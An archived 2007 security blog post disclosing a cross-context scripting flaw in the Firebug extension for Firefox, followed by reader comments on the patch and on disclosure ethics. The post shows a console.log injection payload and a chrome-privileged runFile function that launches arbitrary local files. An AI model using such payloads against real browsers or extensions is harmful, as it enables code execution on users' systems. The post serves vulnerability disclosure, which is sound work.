<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Firebug Goes Evil</title><meta name="description" content="Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests."><meta property="name" content="Firebug Goes Evil"><meta itemprop="name" content="Firebug Goes Evil"><meta property="description" content="Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests."><meta itemprop="description" content="Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Ffirebug-goes-evil%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Ffirebug-goes-evil%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/firebug-goes-evil/"><meta property="og:title" content="Firebug Goes Evil"><meta property="og:description" content="Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Ffirebug-goes-evil%2F?w=1024"><meta name="twitter:title" content="Firebug Goes Evil"><meta name="twitter:description" content="Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Ffirebug-goes-evil%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Firebug Goes Evil</h1><div class="date">Wed, 04 Apr 2007 19:12:38 GMT</div><div class="author">by
<a href="/members/pdp.html">pdp</a></div><div id="post-content"><p>Firebug is a very powerful JavaScript debugger for Firefox. &quot;I love it!&quot; It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests.</p>
<p>Firebug is mainly used by web developers to find bugs in their code but it can also be used from security guys like me to find and explore various client-side and server-side vulnerabilities. Firebug is my best buddy. I even partially based <a href="/blog/technika">Technika</a>, the bookmarklets powertool, on the top of Firebug.</p>
<p>Unfortunately, Firebug suffers from rather simple but quite dangerous vulnerability. I have <a href="/blog/cross-context-scripting-with-sage/">discussed</a> similar issues before. In general, browsers try their best to prevent common vulnerabilities from crippling into their code. However, that&#39;s not the case with browser extensions. Very often, browser extension authors do not consider the security aspects of their work, i.e. extensions are not carefully inspected for security vulnerabilities. Because of this, incidents occur. IMHO, the next wave of browser attacks will target exactly this.</p>
<p>In this post I am going to disclose a vulnerability for Firebug which can be used by attackers to gain control of every system where the Firebug extension is installed. Of course, the user needs to visit a malicious page first, which means that the attack surface is greatly reduced. However, given the fact that the largest user base of the Firefox browser are geeks and Firebug is a top extension at <a href="http://addons.mozilla.org">http://addons.mozilla.org</a>, attackers can cause quite a lot of trouble.</p>
<p>The vulnerability is of a type Cross-zone or Cross-context scripting, where a script from a web pages is injected inside the zone of the browser, also know as the chrome, or in the zone of the file: protocol. In both cases the result is quite devastating, although the second is a bit less critical then the first. Remote scripts in the browser are restricted by a sandbox. This means that everything that is prefixed with http: or https: is secure. Browser extensions make use of the chrome: protocol. This protocol is not restricted at all and everything is allowed. In that respect, browser extensions are trusted. However if a remote script, tricks the browser into executing JavaScript expressions on chrome: then this script can take control of the entire chrome and also the underplaying operating system because then command execution and read/write file access operations are allowed.</p>
<p>In order to cause Cross-zone scripting in Firebug you need to do the following:</p>
<pre><code class="language-javascript"><span class="built_in">console</span>.log({<span class="string">'&lt;script&gt;alert("bing!")&lt;/script&gt;'</span>:<span class="string">'exploit'</span>})</code></pre>
<p>If you put this JavaScript expression into a page and open it with the browser while Firebug is on, you will be prompted with an alert box. This is not very interesting but there is a lot more you can do then that. For <a href="https://chatbotkit.com/examples">example</a>, attackers can easily inject the following function into the browser chrome:</p>
<pre><code class="language-javascript"><span class="function"><span class="keyword">function</span> <span class="title">runFile</span>(<span class="params">f</span>) </span>{
        <span class="keyword">var</span> file = Components.classes[<span class="string">"@mozilla.org/file/local;1"</span>]
                .createInstance(Components.interfaces.nsILocalFile);

        file.initWithPath(f);

        <span class="keyword">var</span> process = Components.classes[<span class="string">"@mozilla.org/process/util;1"</span>]
                .createInstance(Components.interfaces.nsIProcess);

        process.init(file);

        <span class="keyword">var</span> argv = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);

        process.run(<span class="literal">true</span>, argv, argv.length);
}</code></pre>
<p>The function <code>runFile</code> allows execution of files. With the function declaration in the browser chrome, attackers can call <code>console.log</code> a few more times to spawn any file they want or even silently install browser extensions, not to mention that they will be able to read and write the file system too. The possibilities for evilness are endless.</p>
<p>There is a catch though. The Cross-context scripting vector is very tiny. In order to exploit the vulnerability, I needed to go through some extreme things like dynamically composing the malicious payload in a string then evaluating the string content inside the chrome. I wrote two (<a href="/files/2007/04/firebug-poc.htm">1</a>, <a href="/files/2007/04/firebug-poc2.htm">2</a>) Proof of Concept exploits that you can try out.</p>
<p><em>It is highly recommended that you disable Firebug until this issue is fixed which I have no doubt that it will be quite soon.</em></p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><div class="message"><a href="http://michaeldaw.org/" rel="nofollow">David Kierznowski</a> has verified the issue and also suggested that not only <strong>console.log</strong> is vulnerable.</div></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=256&amp;d=retro" alt="Zeroknock"><span class="post-comment-author">Zeroknock</span><div class="post-comment-content">Hey pdp

I am working on the same issue but you got first. Thats good. I think the XPI stuff is going to creat a big problem in upcoming time for the Mozilla.

Regards</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/e6c03dab69dcb70b8e22f7ba45ea0e5b?s=256&amp;d=retro" alt="Delixe"><span class="post-comment-author">Delixe</span><div class="post-comment-content">That is seriously scary as hell. Good find pdp.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=256&amp;d=retro" alt="zeroknock"><span class="post-comment-author">zeroknock</span><div class="post-comment-content">Hey pdp

The proof of code is not working exactly. You got a simple mistake in your code to some extent.This problem i was facing too but resolved it in this way.

You have to use [form tag] with name under which you will use form properties and objects like button etc. 

In the Javascript layout , you must design a funntion annd pass form as its specified parameter.

<pre><code>function exploitFirebug(form) {}

&lt;form name="form"&gt;
Objects
&lt;/form&gt;</code></pre>

With new specification the code wont get execute and the error results in this way  "console.log not defined".

Just sharp a code bit.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Interesting, but the exploit works on my side. So you are saying that you receive errors on your side because I need to put the input elements inside a form? Give me an example. I've tried to exploit on a couple of machines and it worked flawlessly.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/7ef1c803c904b9a9834d3bd7645790bb?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">Great find! Scary find - as professional webdev I use firebug on a daily basis. Since today always switched on...

Again, great find!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/bd38ec8896a46f6a173c7b80aac0d5be?s=256&amp;d=retro" alt="Jordan"><span class="post-comment-author">Jordan</span><div class="post-comment-content">I've always run firebug, but since it causes a bit of a slow down anyway, I always disable it by default except on sites where I explicitly enable it.  Ironically, gnucitizen was one of those sites since I was playing around with carnival a while back.  The list of allowed domains is back down to domains I control... ;-)

Good catch, pdp.  I think it's time to move my browsing habits into a sandbox... /me sighs.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/15cf42a96576559fee2a0f904427b8a0?s=256&amp;d=retro" alt="Joe Hewitt"><span class="post-comment-author">Joe Hewitt</span><div class="post-comment-content">I've released an update to Firebug which fixes this issue.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Thanks Joe,

This is why I like Firefox Extensions: they get fixed easily and the update is almost instantaneous.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a0016c8a3b1fd65cc9e4dd2e5f5810b3?s=256&amp;d=retro" alt="Michael"><span class="post-comment-author">Michael</span><div class="post-comment-content">Thanks for the heads-up.  I use Firebug all the time.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=256&amp;d=retro" alt="zeroknock"><span class="post-comment-author">zeroknock</span><div class="post-comment-content">Hey

Not everyone at this point of time have patched this flaw.Still its hold concern.The question about the code is clear by underlined way.

An Exemplary Layout:

<pre><code>function sendSpam(fspam)
{

}</code></pre>
 

In body section:

<pre><code>&lt;form name="fspam"&gt;
 Calling Objects
&lt;/form&gt;</code></pre>

The form has to be passed as a handler.This will make the POC super flawless.The firefox sometimes wont load the variables if not defined in this way.

<div class="message">The DOM says: Window - Document - Form - Objects.</div>

Its a good programmin layout free from all type os error functionality.You have to just add few lines of code.

Regards</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">gotch you, very weird behaviour though.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=256&amp;d=retro" alt="zeroknock"><span class="post-comment-author">zeroknock</span><div class="post-comment-content">Hey

Thats what i hate about this browser stuff. Sometimes it work and vice versa.

But Still we want the things to be done.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/dcefed997fdd1fe59e9800d12c5f986b?s=256&amp;d=retro" alt="r4w8173"><span class="post-comment-author">r4w8173</span><div class="post-comment-content">It seems that you can disable firebug to prevent the exploitation, but I found out that if you load a local file firebug automatically enables itself even if you have disabled it.

Nice :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">r4w8173,

this is something David Kierznowski suggested as well. It seams that the Firebug disabling features work on http: and https: protocols but not on file:. On file: Firebug is enabled and you cannot do anything about it, unless you completely disable the extension from the Firefox Add-ons dialog.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/81093448990c40218147633947b83a64?s=256&amp;d=retro" alt="C"><span class="post-comment-author">C</span><div class="post-comment-content">I'm using Firebug 1.0.1... is this version safe?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=256&amp;d=retro" alt="Joe Grossberg"><span class="post-comment-author">Joe Grossberg</span><div class="post-comment-content">C:

No. Upgrade.

pdp:

Why would you not have contacted the extension creator directly and waited a day for him to patch it? This seems irresponsible.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/15cf42a96576559fee2a0f904427b8a0?s=256&amp;d=retro" alt="Joe Hewitt"><span class="post-comment-author">Joe Hewitt</span><div class="post-comment-content">I'm about to release another Firebug upgrade which adds support for disabling file: URLs.  My apologies for not doing this in the first place.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><div class="message">Thor Larholm has identified another vulnerability in Firebug which by nature is similar to my finding. This vulnerability affects 1.0.3 which means that you should disable Firebug for now. For more information about the new issue click <a href="http://larholm.com/2007/04/06/more-0day-in-firebug/" rel="nofollow">here</a>.</div></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/93c8230e89d7a7ba5dd5246aad8bdf08?s=256&amp;d=retro" alt="mahalie"><span class="post-comment-author">mahalie</span><div class="post-comment-content">The above exploit has been fixed as well. Joe is very responsive and I thought it would be worth posting his response on the last link here as well:

<blockquote>Joe Hewitt  says:
April 6th, 2007 at 3:44

I have fixed this issue and and released 1.04.

As you suggested, I now escape all text before inserting it into HTML, rather than leaving it up to the caller. I've also added support for disabling file: urls.

I hope there aren't any more vulnerabilities to be found, but if there are, please give me a day to patch it before you publish. I do appreciate you taking the time to make Firebug more secure, but it's better for everyone to have the patch surface before the exploit.

It is a good think that Firefox has an automatic update system, so every Firebug user should be secured within a few days.</blockquote></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Joe G.,

We often need to take extreme routes to make a point otherwise nobody would listen. However, I knew that Joe Hewitt will patch Firebug very quickly because the extension has one of the cleanest source code structures I have ever seen.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=256&amp;d=retro" alt="Joe Grossberg"><span class="post-comment-author">Joe Grossberg</span><div class="post-comment-content">pdp:

It seems to me that saying "you have 48 hours to patch, before we publicize the exploit" would be just as effective in making people listen.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/4550629aa60f7ef68d07db76ff7244ec?s=256&amp;d=retro" alt="Thor Larholm"><span class="post-comment-author">Thor Larholm</span><div class="post-comment-content">I don't think there is anything extreme about publishing a vulnerability when you find it. sure, Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately, but I fail to see how that is my concern. In that regards I have treated him no worse or better than I have treated Microsoft, Mozilla or Valve in the past.

This is research that pdp and I have independently performed. We're not employees of Microsoft or Firebug, instead we are altruistically researching and publishing the very things that others are also researching - but keeping private.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=256&amp;d=retro" alt="Joe Grossberg"><span class="post-comment-author">Joe Grossberg</span><div class="post-comment-content">"I don't think there is anything extreme about publishing a vulnerability when you find it."

You put software users unnecessarily at risk. That's what's wrong with it.

"I fail to see how that is my concern"

Yep, there you go.

You are not "altruistically researching" anything when you don't consider what's best for the end users?

There aren't just two parties involved in these bug reports -- the software developer and the security researcher -- there is a third group with interests at stake: the thousands, if not millions of end users who are vulnerable.

You're right that you don't owe Joe Hewitt anything (though I would opine it would be nice if you extended common courtesy). And you also deserve credit for finding this security hole.

But you do a huge disservice to all the everyday users like me when you dismiss the possibility that "Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately".</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ecd4038308c7a4f1415662deaf92e7a8?s=256&amp;d=retro" alt="Randolph Finder"><span class="post-comment-author">Randolph Finder</span><div class="post-comment-content">I'm looking for a way to detect the version of Firebug running *without* going into Firefox. Registry Keys, file version of specific files, file version in readme files, or anything like that. I'm trying to write a detection of vulnerable versions for a network scanner.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Randolph, so you are saying that you want to detect Firebug remotely? Right now, this is a bit difficult.

If you want to detect Firebug version without going into Firefox, but still being local, you can just read the install.rdf file from Firebug extension folder which is under the Firefox profile folder.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f9fd29cf7c9236ba5fb939520280e6a9?s=256&amp;d=retro" alt="James"><span class="post-comment-author">James</span><div class="post-comment-content">Thor,

I don't think anyone here is saying you should bury the research. We all know that security through obscurity is a fallacy. However, asking you to delay publishing an exploit for a day or two is certainly not unreasonable. It helps protect the users more than the author.

Premature publishing of explicit exploit information is one of the ways that "zero-day" problems become widespread. As a user of Firebug I'd rather you had talked to Joe first. Actually as a user of any software I'd rather you give it's author a chance to patch before publishing exploits.

If you feel you must post immediately, post the information that the vulnerability exists and some basic details without the full "how-to" and follow up later with the full disclosure.

There are certainly times where it's appropriate to use disclosure as a means to force action, but give the author a reasonable chance to respond. It's better for all of us.

James.

Previously Thor Larholm said:

<blockquote>I don't think there is anything extreme about publishing a vulnerability when you find it. sure, Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately, but I fail to see how that is my concern. In that regards I have treated him no worse or better than I have treated Microsoft, Mozilla or Valve in the past.

This is research that pdp and I have independently performed. We're not employees of Microsoft or Firebug, instead we are altruistically researching and publishing the very things that others are also researching - but keeping private.</blockquote></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/7ecda5296862220b8eb6db6adad3ade9?s=256&amp;d=retro" alt="Outlaw Reviews"><span class="post-comment-author">Outlaw Reviews</span><div class="post-comment-content">Yes I think you should inform the owner before you publish or you are just contributing to the problem. So that would make you just as guilty as the people causing all the problems on the net today. But on the other hand its people like you all that help keep the net safe just be responsable with your powers are you doing it for good or evil.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/92423b10619768a996f1b16a7e00fb75?s=256&amp;d=retro" alt="Sebastian"><span class="post-comment-author">Sebastian</span><div class="post-comment-content">To be able to read this post, I had to use Firebug to make the font bold. You can't be serious.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2025 <a href=""></a>. All rights reserved.</p></footer></body></html>